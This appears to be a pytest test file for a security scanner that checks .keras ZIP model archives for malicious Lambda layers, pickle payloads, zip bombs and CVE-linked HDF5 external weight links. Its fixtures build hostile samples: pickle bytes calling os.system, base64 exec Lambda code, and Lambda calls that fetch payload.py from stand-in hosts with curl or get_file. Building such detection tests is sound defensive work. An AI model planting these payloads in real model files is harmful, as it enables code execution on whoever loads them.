"""
Test the Keras ZIP scanner for detecting malicious Lambda layers in .keras files.

The new .keras format is a ZIP archive containing:
- config.json: Model configuration with layer definitions
- metadata.json: Model metadata
- model.weights.h5: Model weights in HDF5 format
"""

import base64
import json
import marshal
import stat
import warnings
import zipfile
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanners import keras_zip_scanner as keras_zip_scanner_module
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
from modelaudit.scanners.keras_zip_scanner import KerasZipScanner, _has_get_file_reference
from modelaudit.utils.file import detection as file_detection

try:
    import h5py
except ImportError:  # pragma: no cover - optional dependency in some environments
    h5py = None


def create_configured_keras_zip(
    tmp_path: Path,
    config: Any,
    *,
    keras_version: str = "3.13.2",
    file_name: str = "model.keras",
    weights_h5_path: Path | None = None,
) -> Path:
    """Create a configurable .keras archive for regression tests."""
    keras_path = tmp_path / file_name
    with zipfile.ZipFile(keras_path, "w") as zf:
        zf.writestr("config.json", json.dumps(config))
        zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
        if weights_h5_path is not None:
            zf.write(weights_h5_path, "model.weights.h5")
    return keras_path


def _build_test_keras_zip(config: dict[str, Any] | str, tmp_path: Path, keras_version: str) -> str:
    """Create a minimal .keras ZIP archive for CVE regression tests."""
    keras_path = tmp_path / "model.keras"
    config_json = config if isinstance(config, str) else json.dumps(config)
    with zipfile.ZipFile(keras_path, "w") as zf:
        zf.writestr("config.json", config_json)
        zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
    return str(keras_path)


def _assert_inconclusive_keras_zip_scan(model_path: Path, reason: str, expected_check_name: str) -> None:
    result = KerasZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert reason in result.metadata["scan_outcome_reasons"]
    assert any(check.name == expected_check_name and check.status == CheckStatus.FAILED for check in result.checks)

    audit_result = scan_model_directory_or_file(str(model_path))
    metadata = audit_result.file_metadata[str(model_path)]

    assert audit_result.has_errors is False
    assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert reason in metadata.get("scan_outcome_reasons")
    assert determine_exit_code(audit_result) == 2


def _assert_inconclusive_keras_zip_scan_not_cached(model_path: Path, reason: str, cache_dir: Path) -> None:
    reset_cache_manager()
    try:
        first_result = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second_result = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for audit_result in (first_result, second_result):
            metadata = audit_result.file_metadata[str(model_path)]
            assert determine_exit_code(audit_result) == 2
            assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
            assert reason in metadata.get("scan_outcome_reasons")
            assert not any(
                issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in audit_result.issues
            )

        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def create_external_link_weights_h5(tmp_path: Path) -> Path:
    """Create a weights H5 file containing an ExternalLink to a local fixture."""
    if h5py is None:
        pytest.skip("h5py not available")

    external_source = tmp_path / "external_source.h5"
    with h5py.File(external_source, "w") as f:
        f.create_dataset("payload", data=[1.0, 2.0])

    weights_path = tmp_path / "model.weights.h5"
    with h5py.File(weights_path, "w") as f:
        f["linked_kernel"] = h5py.ExternalLink(external_source.name, "/payload")

    return weights_path


def create_regular_weights_h5(tmp_path: Path) -> Path:
    """Create a benign embedded weights H5 file."""
    if h5py is None:
        pytest.skip("h5py not available")

    weights_path = tmp_path / "model.weights.h5"
    with h5py.File(weights_path, "w") as f:
        f.create_dataset("kernel", data=[1.0, 2.0])
    return weights_path


class TestKerasZipScanner:
    """Test the Keras ZIP scanner functionality."""

    def test_scanner_available(self):
        """Test that the scanner is available."""
        scanner = KerasZipScanner()
        assert scanner is not None
        assert scanner.name == "keras_zip"

    def test_detects_cve_2026_1669_in_embedded_weights(self, tmp_path: Path) -> None:
        """Vulnerable .keras archives should warn on embedded HDF5 ExternalLink weights."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.WARNING
        assert cve_issues[0].details["keras_version"] == "3.12.0"
        assert cve_issues[0].details["external_references"] == [
            {
                "kind": "ExternalLink",
                "hdf5_path": "/linked_kernel",
                "filename": "external_source.h5",
                "path": "/payload",
            },
        ]

    def test_embedded_hdf5_external_references_are_not_warnings_on_fixed_version(self, tmp_path: Path) -> None:
        """Fixed Keras versions should not fail for embedded external references."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.1",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        assert not any(issue.details.get("cve_id") == "CVE-2026-1669" for issue in result.issues)
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)
        assert any(
            check.name == "HDF5 External Weight Reference Version Check" and check.status == CheckStatus.PASSED
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "keras_version",
        ["3.12.1rc1", "3.12.1a0", "3.12.1.dev0", "3.13.2rc1", "3.13.2dev0"],
    )
    def test_embedded_hdf5_external_references_prerelease_fixes_are_vulnerable(
        self, tmp_path: Path, keras_version: str
    ) -> None:
        """Prereleases of the fixed CVE-2026-1669 versions are still vulnerable."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version=keras_version,
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["keras_version"] == keras_version
        assert cve_issues[0].severity == IssueSeverity.WARNING

    @pytest.mark.parametrize(
        "keras_version",
        ["3.12.1", "3.12.1+cpu", "3.12.1+rc1", "3.13.2", "3.13.2.post1", "3.13.2+dev0"],
    )
    def test_embedded_hdf5_external_references_stable_fixed_versions_pass(
        self, tmp_path: Path, keras_version: str
    ) -> None:
        """Stable fixed CVE-2026-1669 versions should not emit warning noise."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version=keras_version,
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        assert not any(issue.details.get("cve_id") == "CVE-2026-1669" for issue in result.issues)
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_benign_embedded_weights_do_not_emit_warning_noise(self, tmp_path: Path) -> None:
        """Benign embedded weights should not produce warning or critical noise."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.13.2",
            weights_h5_path=create_regular_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    @pytest.mark.parametrize(
        ("config", "reason", "expected_check_name"),
        [
            (None, "keras_zip_config_invalid_type", "Model Config Type Validation"),
            ([], "keras_zip_config_invalid_type", "Model Config Type Validation"),
            (
                {"class_name": "Sequential", "config": None},
                "keras_zip_model_config_structure_invalid",
                "Model Config Structure Validation",
            ),
            (
                {"class_name": "Sequential", "config": "layers hidden in wrong type"},
                "keras_zip_model_config_structure_invalid",
                "Model Config Structure Validation",
            ),
            (
                {"class_name": "Sequential", "config": {"layers": "layers hidden in wrong type"}},
                "keras_zip_model_layers_invalid_type",
                "Layers Type Validation",
            ),
            (
                {"class_name": "Sequential", "config": {"layers": ["not a layer dict"]}},
                "keras_zip_model_layer_invalid_type",
                "Layer Type Validation",
            ),
            (
                {"class_name": "Sequential", "config": {"layer": "not a layer dict"}},
                "keras_zip_model_layer_invalid_type",
                "Single Layer Type Validation",
            ),
            (
                {"class_name": "Sequential", "config": {"layers": []}, "compile_config": ["not", "a", "dict"]},
                "keras_zip_compile_config_invalid_type",
                "Compile Config Type Validation",
            ),
        ],
    )
    def test_invalid_config_json_structure_returns_inconclusive_exit2(
        self,
        tmp_path: Path,
        config: Any,
        reason: str,
        expected_check_name: str,
    ) -> None:
        """Keras ZIP config.json shapes that cannot be fully traversed should fail closed."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            config,
            file_name=f"{reason}.keras",
        )

        _assert_inconclusive_keras_zip_scan(keras_path, reason, expected_check_name)

    def test_invalid_config_json_list_still_detects_get_file_gadget(self, tmp_path: Path) -> None:
        """List-root configs are incomplete but can still contain structured CVE evidence."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            [
                {
                    "class_name": "Lambda",
                    "config": {
                        "fn": "get_file",
                        "kwargs": {"origin": "https://example.invalid/payload.py"},
                    },
                }
            ],
            file_name="list_get_file.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        aggregate_result = scan_model_directory_or_file(
            str(keras_path),
            config={"cache_scan_results": False},
        )

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_invalid_type" in result.metadata["scan_outcome_reasons"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert determine_exit_code(aggregate_result) == 1

    def test_invalid_config_json_list_still_checks_embedded_hdf5_weights(self, tmp_path: Path) -> None:
        """Invalid config structure must not skip independent embedded weights checks."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            [],
            keras_version="3.12.0",
            file_name="list_with_external_weights.keras",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = KerasZipScanner().scan(str(keras_path))
        aggregate_result = scan_model_directory_or_file(
            str(keras_path),
            config={"cache_scan_results": False},
        )

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_invalid_type" in result.metadata["scan_outcome_reasons"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.WARNING
        assert determine_exit_code(aggregate_result) == 1

    def test_invalid_config_json_list_fixed_keras_weights_stays_inconclusive_only(self, tmp_path: Path) -> None:
        """Fixed-version metadata should prevent warning noise even when config shape is invalid."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            [],
            keras_version="3.12.1",
            file_name="fixed_list_with_external_weights.keras",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        aggregate_result = scan_model_directory_or_file(
            str(keras_path),
            config={"cache_scan_results": False},
        )

        metadata = aggregate_result.file_metadata[str(keras_path)]
        security_issues = [
            issue
            for issue in aggregate_result.issues
            if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        ]
        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_invalid_type" in metadata.get("scan_outcome_reasons")
        assert security_issues == []
        assert determine_exit_code(aggregate_result) == 2

    def test_missing_config_json_returns_inconclusive_exit2(self, tmp_path: Path) -> None:
        """A direct Keras ZIP scan without config.json cannot be security-complete."""
        keras_path = tmp_path / "missing_config.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.13.2"}))

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert result.has_errors is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_missing" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Keras ZIP Format Check" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_read_failure_returns_inconclusive_exit2(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Unavailable Keras ZIP content is incomplete analysis, not a security finding."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            file_name="unavailable_content.keras",
        )

        def raise_os_error(
            _self: KerasZipScanner,
            _archive: zipfile.ZipFile,
            _member_name: str,
        ) -> None:
            raise OSError("simulated Keras ZIP member read failure")

        monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", raise_os_error)

        _assert_inconclusive_keras_zip_scan(keras_path, "keras_zip_read_failed", "Keras ZIP File Read")
        result = KerasZipScanner().scan(str(keras_path))
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)
        _assert_inconclusive_keras_zip_scan_not_cached(
            keras_path,
            "keras_zip_read_failed",
            tmp_path / "read-failure-cache",
        )

    @pytest.mark.parametrize(
        ("failure_kind", "expected_reason"),
        [("read", "keras_zip_read_failed"), ("scan", "keras_zip_scan_failed")],
    )
    def test_primary_failure_still_recurses_detectable_payload(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        failure_kind: str,
        expected_reason: str,
    ) -> None:
        """Unavailable Keras analysis must not hide independently detectable ZIP payloads."""
        keras_path = tmp_path / "unavailable_config_with_payload.keras"
        with zipfile.ZipFile(keras_path, "w") as archive:
            archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

        if failure_kind == "read":

            def raise_os_error(
                _self: KerasZipScanner,
                _archive: zipfile.ZipFile,
                _member_name: str,
            ) -> None:
                raise OSError("simulated Keras ZIP member read failure")

            monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", raise_os_error)
        else:

            def raise_runtime_error(_self: KerasZipScanner, _model_config: dict[str, Any], _result: Any) -> None:
                raise RuntimeError("simulated unexpected Keras ZIP scan failure")

            monkeypatch.setattr(KerasZipScanner, "_scan_model_config", raise_runtime_error)

        result = scan_model_directory_or_file(str(keras_path), cache_enabled=False)
        metadata = result.file_metadata[str(keras_path)]

        assert expected_reason in metadata["scan_outcome_reasons"]
        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and issue.details.get("zip_entry") == "payload.pkl"
            and any(symbol in issue.message.lower() for symbol in ("os.system", "posix.system"))
            for issue in result.issues
        )
        assert determine_exit_code(result) == 1

    @pytest.mark.parametrize(
        ("failure_kind", "expected_reason"),
        [("read", "keras_zip_read_failed"), ("scan", "keras_zip_scan_failed")],
    )
    def test_primary_failure_does_not_cache_temporary_recursive_member(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        failure_kind: str,
        expected_reason: str,
    ) -> None:
        """Fallback recursion must not cache extracted members that are immediately deleted."""
        keras_path = tmp_path / f"{failure_kind}_failure_with_benign_payload.keras"
        with zipfile.ZipFile(keras_path, "w") as archive:
            archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            archive.writestr("payload.pkl", b"\x80\x04N.")

        if failure_kind == "read":

            def raise_os_error(
                _self: KerasZipScanner,
                _archive: zipfile.ZipFile,
                _member_name: str,
            ) -> None:
                raise OSError("simulated Keras ZIP member read failure")

            monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", raise_os_error)
        else:

            def raise_runtime_error(_self: KerasZipScanner, _model_config: dict[str, Any], _result: Any) -> None:
                raise RuntimeError("simulated unexpected Keras ZIP scan failure")

            monkeypatch.setattr(KerasZipScanner, "_scan_model_config", raise_runtime_error)

        _assert_inconclusive_keras_zip_scan_not_cached(
            keras_path,
            expected_reason,
            tmp_path / f"{failure_kind}-recursive-member-cache",
        )

    def test_unexpected_scan_failure_returns_inconclusive_exit2_without_cache(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Unexpected unavailable ZIP analysis is incomplete, not a critical model finding."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            file_name="unexpected_scan_failure.keras",
        )

        def fail_config_scan(_self: KerasZipScanner, _model_config: dict[str, Any], _result: Any) -> None:
            raise RuntimeError("simulated unexpected Keras ZIP scan failure")

        monkeypatch.setattr(KerasZipScanner, "_scan_model_config", fail_config_scan)

        _assert_inconclusive_keras_zip_scan(keras_path, "keras_zip_scan_failed", "Keras ZIP File Scan")
        result = KerasZipScanner().scan(str(keras_path))
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)
        _assert_inconclusive_keras_zip_scan_not_cached(
            keras_path,
            "keras_zip_scan_failed",
            tmp_path / "scan-failure-cache",
        )

    def test_malformed_config_json_returns_inconclusive_exit2(self, tmp_path: Path) -> None:
        """Malformed config.json without security evidence should exit 2, not 1."""
        keras_path = tmp_path / "malformed_config.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", "{ invalid json }")

        _assert_inconclusive_keras_zip_scan(
            keras_path,
            "keras_zip_config_parse_failed",
            "Config JSON Parsing",
        )
        result = KerasZipScanner().scan(str(keras_path))
        assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)

    def test_inconclusive_compile_config_preserves_security_exit1(self, tmp_path: Path) -> None:
        """Security findings should still take precedence over incomplete compile_config analysis."""
        encoded_code = base64.b64encode(b"eval('1')").decode()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Lambda",
                            "name": "lambda_1",
                            "config": {"function": [encoded_code, None, None]},
                        }
                    ]
                },
                "compile_config": ["not", "a", "dict"],
            },
            keras_version="2.12.0",
            file_name="lambda_with_invalid_compile_config.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_compile_config_invalid_type" in result.metadata["scan_outcome_reasons"]
        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
        assert determine_exit_code(audit_result) == 1

    def test_inconclusive_config_scan_outcome_uncached_rerun_preserves_exit2(
        self,
        tmp_path: Path,
    ) -> None:
        """Uncached Keras ZIP inconclusive results must still produce exit 2 on subsequent scans."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": "not a list"}},
            file_name="cached_bad_config.keras",
        )
        cache_dir = tmp_path / "cache"

        reset_cache_manager()
        first_result = scan_model_directory_or_file(
            str(keras_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second_result = scan_model_directory_or_file(
            str(keras_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        metadata = second_result.file_metadata[str(keras_path)]

        assert determine_exit_code(first_result) == 2
        assert determine_exit_code(second_result) == 2
        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_model_layers_invalid_type" in metadata.get("scan_outcome_reasons")
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0

    def test_embedded_weights_size_limit_prevents_unbounded_extraction(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Oversized embedded weights should be skipped before extraction to a temp file."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", True)

        scanner = KerasZipScanner({"max_embedded_weights_bytes": 1024})
        keras_path = tmp_path / "oversized_weights.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b"0" * 4096)

        result = scanner.scan(str(keras_path))

        limit_checks = [check for check in result.checks if check.name == "Embedded Weights Size Limit"]
        assert len(limit_checks) == 1
        assert limit_checks[0].status == CheckStatus.FAILED
        assert limit_checks[0].details["uncompressed_size"] == 4096
        assert limit_checks[0].details["max_embedded_weights_bytes"] == 1024
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_embedded_weights_too_large" in result.metadata["scan_outcome_reasons"]
        assert not any(issue.details.get("cve_id") == "CVE-2026-1669" for issue in result.issues)

    def test_embedded_weights_size_skip_preserves_zip_bomb_detection(self, tmp_path: Path) -> None:
        keras_path = tmp_path / "compressed_oversized_weights.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b"0" * ((1024 * 1024) + 1))

        result = KerasZipScanner({"max_embedded_weights_bytes": 1024}).scan(str(keras_path))

        assert any(
            check.name == "Compression Ratio Check"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "model.weights.h5"
            and check.rule_code == "S410"
            for check in result.checks
        )

    def test_configured_recursive_member_skip_is_never_clean(self, tmp_path: Path) -> None:
        keras_path = tmp_path / "configured_skip.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))

        result = KerasZipScanner({"skip_archive_entries": ["metadata.json"]}).scan(str(keras_path))

        assert result.success is False
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "ZIP Member Analysis Coverage"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "metadata.json"
            for check in result.checks
        )

    def test_embedded_weights_size_limit_runs_without_h5py(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The size-limit fail-closed reason does not require optional HDF5 parsing."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)

        scanner = KerasZipScanner({"max_embedded_weights_bytes": 1024})
        keras_path = tmp_path / "oversized_weights_without_h5py.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b"0" * 4096)

        result = scanner.scan(str(keras_path))

        limit_checks = [check for check in result.checks if check.name == "Embedded Weights Size Limit"]
        assert len(limit_checks) == 1
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_embedded_weights_too_large" in result.metadata["scan_outcome_reasons"]

    def test_embedded_weights_size_limit_returns_exit2_and_skips_cache(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Oversized embedded weights must fail closed at the aggregate/cache boundary."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", True)

        keras_path = tmp_path / "cached_oversized_weights.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b"0" * 4096)
        cache_dir = tmp_path / "cache"

        reset_cache_manager()
        first_result = scan_model_directory_or_file(
            str(keras_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            max_embedded_weights_bytes=1024,
        )
        second_result = scan_model_directory_or_file(
            str(keras_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            max_embedded_weights_bytes=1024,
        )
        metadata = second_result.file_metadata[str(keras_path)]

        assert determine_exit_code(first_result) == 2
        assert determine_exit_code(second_result) == 2
        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_embedded_weights_too_large" in metadata.get("scan_outcome_reasons")
        assert any(
            issue.message.startswith("Skipping embedded model.weights.h5 inspection") for issue in second_result.issues
        )
        assert not any(
            issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in second_result.issues
        )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0

    @pytest.mark.parametrize(
        "scanner_config",
        [
            {"max_embedded_weights_bytes": "1024"},
            {"max_embedded_weights_bytes": None},
            {"max_embedded_weights_bytes": True},
            {"max_file_read_size": "2048"},
        ],
    )
    def test_invalid_embedded_weight_limit_config_uses_default(
        self,
        tmp_path: Path,
        scanner_config: dict[str, Any],
    ) -> None:
        """Invalid size-limit config values should not crash scans or force bogus 1-byte limits."""
        scanner = KerasZipScanner(scanner_config)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.13.2",
            weights_h5_path=create_regular_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        assert scanner.max_embedded_weights_bytes == KerasZipScanner.MAX_EMBEDDED_WEIGHTS_BYTES
        assert result.success
        assert all(check.name != "Embedded Weights Size Limit" for check in result.checks)
        assert not any(check.name == "Keras ZIP File Scan" for check in result.checks)

    def test_can_handle_keras_zip(self, tmp_path: Path) -> None:
        """Test that scanner can identify ZIP-based .keras files."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "model.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            config = {"class_name": "Sequential", "config": {"layers": []}}
            zf.writestr("config.json", json.dumps(config))
            metadata = {"keras_version": "3.0.0"}
            zf.writestr("metadata.json", json.dumps(metadata))

        assert scanner.can_handle(str(keras_path))

    def test_can_handle_keras_zip_with_only_config_json(self, tmp_path: Path) -> None:
        """A real .keras suffix should still route to the Keras scanner with only config.json."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "config_only.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            config = {"class_name": "Sequential", "config": {"layers": []}}
            zf.writestr("config.json", json.dumps(config))

        assert scanner.can_handle(str(keras_path))

    def test_scan_normalized_config_member_and_recurses_embedded_pickle(self, tmp_path: Path) -> None:
        """Normalized ./config.json members should still receive Keras and recursive ZIP scans."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "normalized_config.keras"
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {"class_name": "InputLayer", "name": "input_1", "config": {}},
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                    },
                ]
            },
        }
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps(config))
            zf.writestr("./metadata.json", json.dumps({"keras_version": "3.0.0"}))
            zf.writestr("./payload.pkl", b"cos\nsystem\n(S'echo pwned'\ntR.")

        result = scanner.scan(str(keras_path))

        assert result.metadata.get("keras_version") == "3.0.0"
        assert any("lambda" in issue.message.lower() for issue in result.issues)
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "./payload.pkl"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )

    def test_lambda_code_preview_redacts_secret_bearing_evidence(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner()
        malicious_code = (
            "__import__('os').system('curl "
            "https://storage.example/payload.py?X-Amz-Signature=SIGNED123&ok=1 "
            "Authorization: Bearer ZIPSECRET456')"
        )
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                    },
                ],
            },
        }
        keras_path = create_configured_keras_zip(tmp_path, config, keras_version="3.0.0")

        result = scanner.scan(str(keras_path))

        serialized = result.to_json()
        dangerous_lambda = [check for check in result.checks if check.name == "Dangerous Lambda Layer"]
        assert len(dangerous_lambda) == 1
        preview = dangerous_lambda[0].details["code_preview"]
        assert "SIGNED123" not in serialized
        assert "ZIPSECRET456" not in serialized
        assert "curl" in preview
        assert "ok=1" in preview
        assert "X-Amz-Signature=<redacted>" in preview
        assert "Authorization: Bearer <redacted>" in preview

    def test_scan_normalized_weights_member_checks_embedded_hdf5_external_references(self, tmp_path: Path) -> None:
        """Normalized ./model.weights.h5 members should still receive Keras-specific HDF5 checks."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "normalized_weights.keras"
        weights_path = create_external_link_weights_h5(tmp_path)
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("./metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.write(weights_path, "./model.weights.h5")

        result = scanner.scan(str(keras_path))

        assert result.metadata.get("keras_version") == "3.12.0"
